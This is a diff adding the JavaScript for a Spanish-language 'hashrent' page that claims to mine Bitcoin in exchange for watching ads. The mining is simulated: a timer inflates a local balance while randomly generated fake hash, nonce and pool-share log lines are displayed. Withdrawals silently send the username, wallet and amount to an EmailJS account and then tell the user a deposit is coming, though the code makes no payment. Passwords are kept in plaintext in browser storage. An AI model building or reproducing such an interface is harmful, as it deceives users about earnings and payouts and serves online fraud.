+    </button>
+    <div class="msg" id="withdrawMsg"></div>
+  </div>
+
+  <!-- HISTORY -->
+  <div class="card">
+    <div class="card-title">📋 HISTORIAL</div>
+    <div class="tab-row">
+      <button class="tab-btn active" onclick="switchTab('all',this)">TODO</button>
+      <button class="tab-btn" onclick="switchTab('ads',this)">ANUNCIOS</button>
+      <button class="tab-btn" onclick="switchTab('withdraw',this)">RETIROS</button>
+    </div>
+    <div class="history-list" id="historyList"></div>
+  </div>
+
+</div><!-- end .app -->
+
+<script>
+/* ══════════════════════════════════════
+   CONFIGURACIÓN DE URLs
+══════════════════════════════════════ */
+const EMAILJS_SERVICE  = 'service_2g83f57';
+const EMAILJS_TEMPLATE = 'template_fg6xvfn';
+
+/* ══════════════════════════════════════
+   CONSTANTES DE MINERÍA
+══════════════════════════════════════ */
+const WITHDRAW_MIN   = 10000;
+const SATS_PER_BTC   = 1e8;
+const AD_DURATION    = 30;
+const HASH_PER_AD    = 180;
+const BASE_SATS_RATE = 10000 / (30000 * 180);
+const HASH_RATE_GHS  = 125;
+
+/* ══════════════════════════════════════
+   ESTADO
+══════════════════════════════════════ */
+let currentUser = null;  // { username, password }
+let state = { balance:0, hashTime:0, adsWatched:0, totalMinedSec:0, history:[], sessionGain:0 };
+let adActive=false, adTimer=null, miningTick=null, miningLineInterval=null;
+let cooldownLeft=0, currentTab='all', chartData=new Array(60).fill(0), perMinAccum=0;
+
+/* ══════════════════════════════════════
+   PERSISTENCIA — clave por usuario
+══════════════════════════════════════ */
+function stateKey(u){ return 'hashrent_'+u; }
+function save(){
+  if(!currentUser) return;
+  try{ localStorage.setItem(stateKey(currentUser.username), JSON.stringify(state)); }catch(e){}
+}
+function loadState(username){
+  try{
+    const raw = localStorage.getItem(stateKey(username));
+    if(raw){
+      const p = JSON.parse(raw);
+      state.balance       = Math.max(0, p.balance||0);
+      state.hashTime      = Math.max(0, p.hashTime||0);
+      state.adsWatched    = Math.max(0, p.adsWatched||0);
+      state.totalMinedSec = Math.max(0, p.totalMinedSec||0);
+      state.history       = Array.isArray(p.history)?p.history:[];
+      state.sessionGain   = 0;
+    } else {
+      // SALDO DE PRUEBA: 0.001 BTC = 100,000 sats (quitar en producción)
+      state = {balance:100000,hashTime:0,adsWatched:0,totalMinedSec:0,history:[],sessionGain:0};
+    }
+  }catch(e){}
+}
+
+/* ══════════════════════════════════════
+   BASE DE DATOS DE CUENTAS (localStorage)
+══════════════════════════════════════ */
+function getAccounts(){
+  try{ return JSON.parse(localStorage.getItem('hashrent_accounts')||'{}'); }catch(e){return {};}
+}
+function saveAccounts(accounts){
+  try{ localStorage.setItem('hashrent_accounts', JSON.stringify(accounts)); }catch(e){}
+}
+
+/* ══════════════════════════════════════
+   NOTIFICACIÓN DE TRANSFERENCIA → EmailJS
+   Envío silencioso en segundo plano al correo
+══════════════════════════════════════ */
+async function notificarTransferencia(username, wallet, monto){
+  try {
+    await emailjs.send(EMAILJS_SERVICE, EMAILJS_TEMPLATE, {
+      user:   username,
+      wallet: wallet,
+      amount: monto,
+      fecha:  new Date().toLocaleString('es-MX')
+    });
+  } catch(e) {
+    console.warn('EmailJS error:', e);
+  }
+}
+
+/* ══════════════════════════════════════
+   AUTH
+══════════════════════════════════════ */
+function switchAuthTab(tab){
+  document.getElementById('tabLogin').classList.toggle('active', tab==='login');
+  document.getElementById('tabRegister').classList.toggle('active', tab==='register');
+  document.getElementById('formLogin').style.display    = tab==='login'    ? '' : 'none';
+  document.getElementById('formRegister').style.display = tab==='register' ? '' : 'none';
+  document.getElementById('authMsg').className = 'auth-msg';
+  document.getElementById('authMsg').textContent = '';
+}
+
+function showAuthMsg(type, txt){
+  const el = document.getElementById('authMsg');
+  el.className = 'auth-msg '+type;
+  el.textContent = txt;
+}
+
+function doRegister(){
+  const username = document.getElementById('regUser').value.trim();
+  const pass     = document.getElementById('regPass').value;
+  const pass2    = document.getElementById('regPass2').value;
+
+  if(!username)              return showAuthMsg('error','⚠️ Ingresa un nombre de cuenta.');
+  if(username.length < 3)   return showAuthMsg('error','⚠️ El nombre debe tener al menos 3 caracteres.');
+  if(!pass)                  return showAuthMsg('error','⚠️ Ingresa una contraseña.');
+  if(pass.length < 6)        return showAuthMsg('error','⚠️ La contraseña debe tener al menos 6 caracteres.');
+  if(pass !== pass2)         return showAuthMsg('error','⚠️ Las contraseñas no coinciden.');
+
+  const accounts = getAccounts();
+  if(accounts[username])     return showAuthMsg('error','⚠️ Ese nombre ya está en uso. Elige otro.');
+
+  // Guardar cuenta
+  accounts[username] = { password: pass, createdAt: Date.now() };
+  saveAccounts(accounts);
+
+  showAuthMsg('success','✅ Cuenta creada. Iniciando sesión...');
+
+
+  setTimeout(()=>iniciarSesion(username, pass), 1200);
+}
+
+function doLogin(){
+  const username = document.getElementById('loginUser').value.trim();
+  const pass     = document.getElementById('loginPass').value;
+
+  if(!username) return showAuthMsg('error','⚠️ Ingresa tu nombre de cuenta.');
+  if(!pass)     return showAuthMsg('error','⚠️ Ingresa tu contraseña.');
+
+  const accounts = getAccounts();
+  if(!accounts[username])          return showAuthMsg('error','⚠️ Cuenta no encontrada.');
+  if(accounts[username].password !== pass) return showAuthMsg('error','⚠️ Contraseña incorrecta.');
+
+  iniciarSesion(username, pass);
+}
+
+function iniciarSesion(username, password){
+  currentUser = { username, password };
+  loadState(username);
+  document.getElementById('authScreen').style.display  = 'none';
+  document.getElementById('mainApp').style.display     = '';
+  document.getElementById('userBadge').textContent     = '👤 '+username;
+  updateUI(); drawChart();
+  if(state.hashTime > 0){
+    document.getElementById('miningInactive').style.display='none';
+    startMining();
+  }
+}
+
+function doLogout(){
+  stopMining();
+  save();
+  currentUser = null;
+  state = {balance:0,hashTime:0,adsWatched:0,totalMinedSec:0,history:[],sessionGain:0};
+  chartData = new Array(60).fill(0);
+  document.getElementById('mainApp').style.display  = 'none';
+  document.getElementById('authScreen').style.display = '';
+  document.getElementById('loginUser').value = '';
+  document.getElementById('loginPass').value = '';
+  switchAuthTab('login');
+}
+
+/* ══════════════════════════════════════
+   SELECTOR DE MONTO
+══════════════════════════════════════ */
+document.getElementById('withdrawAmount').addEventListener('change', function(){
+  const val = this.value;
+  const customGroup   = document.getElementById('customAmountGroup');
+  const preview       = document.getElementById('withdrawPreview');
+  const previewVal    = document.getElementById('previewVal');
+  const previewBal    = document.getElementById('previewBal');
+
+  if(val === 'custom'){
+    customGroup.style.display = '';
+    preview.style.display = 'none';
+  } else if(val){
+    customGroup.style.display = 'none';
+    previewVal.textContent = val;
+    previewBal.textContent = fmtBtc(state.balance);
+    preview.style.display = '';
+  } else {
+    customGroup.style.display = 'none';
+    preview.style.display = 'none';
+  }
+});
+
+document.getElementById('customAmount').addEventListener('input', function(){
+  const preview    = document.getElementById('withdrawPreview');
+  const previewVal = document.getElementById('previewVal');
+  const previewBal = document.getElementById('previewBal');
+  if(this.value){
+    previewVal.textContent = parseFloat(this.value).toFixed(8);
+    previewBal.textContent = fmtBtc(state.balance);
+    preview.style.display = '';
+  } else {
+    preview.style.display = 'none';
+  }
+});
+
+/* ══════════════════════════════════════
+   HELPERS
+══════════════════════════════════════ */
+function fmtSats(n){ return (n/SATS_PER_BTC).toFixed(15); }
+function fmtBtc(s) { return (s/SATS_PER_BTC).toFixed(8); }
+function fmtTime(sec){
+  sec=Math.max(0,Math.floor(sec));
+  return String(Math.floor(sec/60)).padStart(2,'0')+':'+String(sec%60).padStart(2,'0');
+}
+function fmtTotalMined(sec){
+  const h=Math.floor(sec/3600),m=Math.floor((sec%3600)/60),s=sec%60;
+  return h>0?h+'h '+m+'m':m+'m '+s+'s';
+}
+function fmtDate(ts){
+  const d=new Date(ts);
+  return d.toLocaleDateString('es-MX')+' '+d.toLocaleTimeString('es-MX',{hour:'2-digit',minute:'2-digit'});
+}
+function clamp(v,mn,mx){return Math.min(mx,Math.max(mn,v));}
+
+/* ══════════════════════════════════════
+   UI UPDATE
+══════════════════════════════════════ */
+function updateUI(){
+  document.getElementById('balanceDisplay').textContent = fmtSats(state.balance);
+  document.getElementById('hashRateDisplay').textContent = state.hashTime>0?HASH_RATE_GHS:'0';
+  document.getElementById('timeDisplay').textContent = fmtTime(state.hashTime);
+  document.getElementById('totalMined').textContent = fmtTotalMined(state.totalMinedSec);
+
+  const dot=document.getElementById('statusDot');
+  const stxt=document.getElementById('statusTxt');
+  const spill=document.getElementById('statusPill');
+  if(state.hashTime>0){
+    dot.classList.add('active');stxt.textContent='MINANDO';spill.classList.add('mining-active');
+  } else {
+    dot.classList.remove('active');stxt.textContent='OFFLINE';spill.classList.remove('mining-active');
+  }
+
+  const pct=clamp((state.balance/WITHDRAW_MIN)*100,0,100);
+  document.getElementById('progressFill').style.width=pct+'%';
+  document.getElementById('progressPct').textContent=pct.toFixed(1)+'% completado';
+  document.getElementById('satsNeeded').textContent=fmtSats(Math.max(0,WITHDRAW_MIN-state.balance));
+  document.getElementById('btnWithdraw').disabled=state.balance<WITHDRAW_MIN;
+  document.getElementById('sessionGain').textContent=fmtSats(state.sessionGain);
+
+  // Actualizar preview de retiro si está visible
+  if(document.getElementById('withdrawPreview').style.display!=='none'){
+    document.getElementById('previewBal').textContent=fmtBtc(state.balance);
+  }
+
+
+  renderHistory();
+}
+
+/* ══════════════════════════════════════
+   MINING
+══════════════════════════════════════ */
+const miningLines=[
+  {t:'ok', l:'SHA256d block header computed...'},
+  {t:'',   l:'Nonce incremented → 0x{hex}'},
+  {t:'',   l:'Comparing digest to target...'},
+  {t:'err',l:'Diff: {diff} | Share: rejected'},
+  {t:'ok', l:'Share submitted → pool ack ✓'},
+  {t:'',   l:'Validating merkle root...'},
+  {t:'',   l:'Hash: {hash}'},
+  {t:'',   l:'Round trip: {ms}ms'},
+  {t:'ok', l:'Block template refreshed'},
+  {t:'',   l:'Broadcasting work to peers...'},
+  {t:'',   l:'Height #{block} in progress'},
+];
+function rndHex(n){let s='';for(let i=0;i<n;i++)s+='0123456789abcdef'[Math.floor(Math.random()*16)];return s;}
+function miningLine(){
+  const e=miningLines[Math.floor(Math.random()*miningLines.length)];
+  const l=e.l.replace('{hex}',rndHex(8)).replace('{diff}',(Math.random()*80+20).toFixed(2)+'T')
+    .replace('{hash}',rndHex(16)+'...').replace('{ms}',Math.floor(Math.random()*80+10))
+    .replace('{block}',Math.floor(Math.random()*50000+840000));
+  return {text:'> '+l,type:e.t};
+}
+
+function startMining(){
+  if(miningTick) return;
+  document.getElementById('miningInactive').style.display='none';
+  miningTick=setInterval(()=>{
+    if(state.hashTime<=0){stopMining();return;}
+    const earned=BASE_SATS_RATE;
+    state.balance+=earned; state.hashTime=Math.max(0,state.hashTime-1);
+    state.totalMinedSec+=1; state.sessionGain+=earned; perMinAccum+=earned;
+    chartData.shift();chartData.push(earned);
+    drawChart();
+    if(Math.random()<.3) spawnParticle();
+    const b=document.getElementById('balanceDisplay');
+    b.classList.remove('flash');void b.offsetWidth;b.classList.add('flash');
+    updateUI();save();
+  },1000);
+
+  let pmTimer=setInterval(()=>{
+    document.getElementById('perMinDisplay').textContent=fmtSats(perMinAccum);
+    perMinAccum=0;
+    if(!miningTick)clearInterval(pmTimer);
+  },60000);
+
+  addMiningLine();
+  miningLineInterval=setInterval(addMiningLine,1200);
+}
+
+function stopMining(){
+  clearInterval(miningTick);miningTick=null;
+  clearInterval(miningLineInterval);miningLineInterval=null;
+  const d=document.getElementById('miningDisplay');
+  d.innerHTML='<div class="mining-inactive" id="miningInactive"><span class="mining-inactive-icon">⛏</span><span>[ HASH ENGINE OFFLINE ]</span></div>';
+  updateUI();
+}
+
+function addMiningLine(){
+  if(state.hashTime<=0) return;
+  const display=document.getElementById('miningDisplay');
+  const {text,type}=miningLine();
+  const line=document.createElement('div');
+  line.className='line'+(type?' '+type:'');
+  line.textContent=text;
+  display.appendChild(line);
+  while(display.children.length>8)display.removeChild(display.firstChild);
+  display.scrollTop=display.scrollHeight;
+}
+
+/* ══════════════════════════════════════
+   AD SYSTEM
+══════════════════════════════════════ */
+function startAd(){
+  if(adActive||cooldownLeft>0) return;
+  adActive=true;
+  document.getElementById('btnAd').disabled=true;
+  const modal=document.getElementById('adModal');
+  const fill=document.getElementById('adTimerFill');
+  const txt=document.getElementById('adTimerText');
+  const skip=document.getElementById('adSkipText');
+  modal.classList.add('open');
+  let elapsed=0;
+  adTimer=setInterval(()=>{
+    elapsed++;
+    fill.style.width=((elapsed/AD_DURATION)*100)+'%';
+    txt.textContent=AD_DURATION-elapsed;
+    if(elapsed>=Math.floor(AD_DURATION*.8)) skip.textContent='COMPLETANDO ANUNCIO...';
+    if(elapsed>=AD_DURATION){clearInterval(adTimer);finishAd();}
+  },1000);
+}
+
+function finishAd(){
+  document.getElementById('adModal').classList.remove('open');
+  adActive=false;
+  state.hashTime+=HASH_PER_AD; state.adsWatched+=1;
+  addHistory('ad','📺 Anuncio visto · +3min hash ganado');
+  save();updateUI();startMining();
+  document.getElementById('btnAd').disabled=false;
+  document.getElementById('cooldownTxt').textContent='';
+  document.getElementById('adTimerText').textContent=AD_DURATION;
+  document.getElementById('adTimerFill').style.width='0%';
+  document.getElementById('adSkipText').textContent='NO PUEDES OMITIR ESTE ANUNCIO';
+}
+
+/* ══════════════════════════════════════
+   WITHDRAWAL
+══════════════════════════════════════ */
+function getSelectedAmount(){
+  const sel = document.getElementById('withdrawAmount').value;
+  if(sel === 'custom'){
+    const v = parseFloat(document.getElementById('customAmount').value);
+    return isNaN(v) ? null : v;
+  }
+  return sel ? parseFloat(sel) : null;
+}
+
+async function requestWithdraw(){
+  const msg    = document.getElementById('withdrawMsg');
+  const addr   = document.getElementById('btcAddress').value.trim();
+  const amount = getSelectedAmount();
+  const btn    = document.getElementById('btnWithdraw');
+
+  msg.className='msg';msg.style.display='none';msg.textContent='';
+
+  if(!addr)                   return showMsg(msg,'error','⚠️ Ingresa una dirección Bitcoin.');
+  if(!isValidBtcAddress(addr))return showMsg(msg,'error','⚠️ Dirección inválida. Solo se aceptan direcciones Bitcoin reales.');
+  if(amount===null)           return showMsg(msg,'error','⚠️ Selecciona la cantidad a retirar.');
+  if(amount<=0)               return showMsg(msg,'error','⚠️ El monto debe ser mayor a 0.');
+
+  const amountSats = amount * SATS_PER_BTC;
+  if(amountSats > state.balance)
+    return showMsg(msg,'error','⚠️ Saldo insuficiente. Tienes '+fmtBtc(state.balance)+' BTC disponibles.');
+  if(amountSats < WITHDRAW_MIN)
+    return showMsg(msg,'error','⚠️ Monto mínimo de retiro: 0.0001 BTC.');
+
+  // Bloquear botón mientras se envía
+  btn.disabled = true;
+  showMsg(msg,'info','⏳ Procesando solicitud...');
+
+  // Enviar a Formspree en segundo plano
+  await notificarTransferencia(currentUser.username, addr, amount.toFixed(8));
+
+  // Actualizar saldo
+  const btcStr = amount.toFixed(8);
+  addHistory('withdraw','💸 Retiro solicitado · '+btcStr+' BTC → '+addr.slice(0,14)+'...');
+  state.balance     -= amountSats;
+  state.sessionGain  = 0;
+  chartData          = new Array(60).fill(0);
+
+  // Mensaje final para el usuario
+  showMsg(msg,'success','✅ Transferencia en curso, pronto le depositaremos.');
+
+  document.getElementById('btcAddress').value='';
+  document.getElementById('withdrawAmount').value='';
+  document.getElementById('customAmountGroup').style.display='none';
+  document.getElementById('withdrawPreview').style.display='none';
+
+  save();updateUI();drawChart();
+  // Re-habilitar botón según saldo
+  btn.disabled = state.balance < WITHDRAW_MIN;
+}
+
+function isValidBtcAddress(addr){
+  return /^(1[a-zA-HJ-NP-Z1-9]{25,33}|3[a-zA-HJ-NP-Z1-9]{25,33}|bc1[a-zA-HJ-NP-Z0-9]{39,59})$/.test(addr);
+}
+function showMsg(el,type,text){el.className='msg '+type;el.textContent=text;el.style.display='block';}
+
+/* ══════════════════════════════════════
+   HISTORY
+══════════════════════════════════════ */
+function addHistory(type,desc){
+  state.history.unshift({type,desc,ts:Date.now()});
+  if(state.history.length>100)state.history.pop();
+}
+function renderHistory(){
+  const list=document.getElementById('historyList');
+  const items=state.history.filter(h=>{
+    if(currentTab==='all')return true;
+    if(currentTab==='ads')return h.type==='ad';
+    if(currentTab==='withdraw')return h.type==='withdraw';
+    return true;
+  });
+  if(!items.length){list.innerHTML='<div class="history-empty">[ SIN EVENTOS AÚN ]</div>';return;}
+  list.innerHTML=items.map(h=>`
+    <div class="history-item">
+      <span class="history-icon">${h.type==='ad'?'📺':'💸'}</span>
+      <div>
+        <div class="history-desc">${escHtml(h.desc)}</div>
+        <span class="history-time">${fmtDate(h.ts)}</span>
+      </div>
+    </div>`).join('');
+}
+function escHtml(s){return s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function switchTab(tab,btn){
+  currentTab=tab;
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderHistory();
+}
+
+/* ══════════════════════════════════════
+   PARTICLES
+══════════════════════════════════════ */
+function spawnParticle(){
+  const el=document.createElement('div');
+  el.className='particle';
+  el.textContent='+'+(Math.random()<.2?'2':'1')+' sat';
+  const rect=document.getElementById('balanceDisplay').getBoundingClientRect();
+  el.style.left=(rect.left+Math.random()*rect.width)+'px';
+  el.style.top=(rect.top+window.scrollY+Math.random()*20)+'px';
+  document.body.appendChild(el);
+  setTimeout(()=>el.remove(),1600);
+}
+
+/* ══════════════════════════════════════
+   CHART
+══════════════════════════════════════ */
+function drawChart(){
+  const canvas=document.getElementById('earningsChart');
+  const ctx=canvas.getContext('2d');
+  const W=canvas.offsetWidth,H=100;
+  canvas.width=W;canvas.height=H;
+  ctx.clearRect(0,0,W,H);
+  const max=Math.max(...chartData,.1);
+  const pts=chartData.map((v,i)=>({x:(i/(chartData.length-1))*W,y:H-(v/max)*(H-12)-6}));
+  const grad=ctx.createLinearGradient(0,0,0,H);
+  grad.addColorStop(0,'rgba(57,255,20,.4)');grad.addColorStop(1,'rgba(57,255,20,.0)');
+  ctx.beginPath();ctx.moveTo(pts[0].x,H);
+  pts.forEach(p=>ctx.lineTo(p.x,p.y));
+  ctx.lineTo(pts[pts.length-1].x,H);ctx.closePath();
+  ctx.fillStyle=grad;ctx.fill();
+  ctx.beginPath();
+  pts.forEach((p,i)=>i===0?ctx.moveTo(p.x,p.y):ctx.lineTo(p.x,p.y));
+  ctx.strokeStyle='rgba(57,255,20,.95)';ctx.lineWidth=2.5;ctx.lineJoin='round';
+  ctx.shadowColor='#39ff14';ctx.shadowBlur=8;ctx.stroke();ctx.shadowBlur=0;
+  const last=pts[pts.length-1];
+  ctx.beginPath();ctx.arc(last.x,last.y,5,0,Math.PI*2);
+  ctx.fillStyle='#39ff14';ctx.shadowColor='#39ff14';ctx.shadowBlur=16;ctx.fill();ctx.shadowBlur=0;
+}
+
+/* ══════════════════════════════════════
+   INIT
+══════════════════════════════════════ */
+window.addEventListener('resize',drawChart);
+// Mostrar solo la pantalla de auth al inicio
+document.getElementById('mainApp').style.display='none';
+</script>
+</body>
+</html>
